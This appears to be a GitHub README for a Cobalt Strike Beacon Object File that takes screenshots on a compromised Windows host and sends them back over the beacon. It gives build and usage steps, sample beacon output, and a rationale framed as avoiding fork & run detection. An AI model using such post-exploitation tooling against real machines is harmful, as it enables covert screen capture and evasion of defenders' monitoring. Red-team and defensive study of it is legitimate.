# ScreenshotBOF

An alternative screenshot capability for Cobalt Strike that uses WinAPI and does not perform a fork & run. Screenshot downloaded in memory.

## Self Compilation
1. git clone the repo
2. open the solution in Visual Studio
3. Build project BOF

## Save methods:  
0. drop file to disk
1. download file over beacon (Cobalt Strike only)

## Usage
1. import the screenshotBOF.cna script into Cobalt Strike
2. use the command screenshot_bof {local filename} {save method 0/1}
  
```
beacon> screenshot_bof sad.bmp 1
[*] Running screenshot BOF by (@codex_tf2)
[+] host called home, sent: 5267 bytes
[+] received output:
[*] Screen saved to bitmap
[+] received output:
[*] Downloading bitmap over beacon with filename sad.bmp
[*] started download of sad.bmp
```

3. if downloaded over beacon, BMP can be viewed in Cobalt Strike by right clicking the download and clicking "Render BMP" (credit @BinaryFaultline)
![image](https://user-images.githubusercontent.com/29991665/199232459-0601e5d8-d534-4f05-bde4-c8acf3bd3c12.png)


## Notes
- no evasion is performed, which should be fine since the WinAPIs used are not malicious

## Why did I make this?
Cobalt Strike uses a technique known as fork & run for many of its post-ex capabilities, including the screenshot command. While this behaviour provides stability, it is now well known and heavily monitored for. This BOF is meant to provide a more OPSEC safe version of the screenshot capability.

## Credits
- Made using https://github.com/securifybv/Visual-Studio-BOF-template
- Save BMP to file from https://stackoverflow.com/a/60667564
- in memory download from https://github.com/anthemtotheego/CredBandit
- @BinaryFaultline for BMP rendering in aggressorscript, and screenshot callback branch
